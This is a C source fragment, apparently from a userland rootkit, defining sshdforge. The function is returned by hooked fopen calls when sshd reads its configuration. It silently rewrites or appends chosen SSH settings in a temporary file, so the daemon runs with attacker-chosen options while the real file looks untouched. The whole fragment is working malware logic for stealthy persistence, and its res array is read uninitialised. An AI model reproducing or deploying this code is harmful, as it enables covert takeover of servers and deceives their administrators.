/* the function in here works the same exact way as the original.
 * this is just inherently a thousand times better... this pointer
 * is returned by the (f)open hooks when being called by sshd.
 * see the original for better comments. */

FILE *sshdforge(const char *pathname){
    FILE *fp, *tmp;
    char line[LINE_MAX],
         *linedup,
         *curtarget, *cursettingval;
    size_t targetlen;
    int skipline, res[PATCHTARGETS_SIZE];

    hook(CFOPEN, CFWRITE);

    fp = call(CFOPEN, pathname, "r");
    if(fp == NULL) return NULL;

    tmp = tmpfile();
    if(tmp == NULL) return fp;

    while(fgets(line,sizeof(line),fp) != NULL){
        skipline = 0;

        for(int i = 0; i < PATCHTARGETS_SIZE; i++){
            if(res[i] == 1)
                continue;

            curtarget = patchtargets[i];
            targetlen = strlen(curtarget);

            if(!strncmp(line, curtarget, targetlen)){
                linedup = strdup(line);

                cursettingval = strtok(linedup, " ");
                cursettingval = strtok(NULL, " ");

                if(strstr(cursettingval, antival[i])){
                    fprintf(tmp, "%s %s\n", curtarget, targetval[i]);
                    skipline = 1;
                }

                res[i] = 1;
                free(linedup);
                break;
            }
        }

        if(!skipline)
            fprintf(tmp, "%s", line);
    }

    for(int i = 0; i != PATCHTARGETS_SIZE; i++)
        if(res[i] != 1)
            fprintf(tmp, "%s %s\n", patchtargets[i], targetval[i]);

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}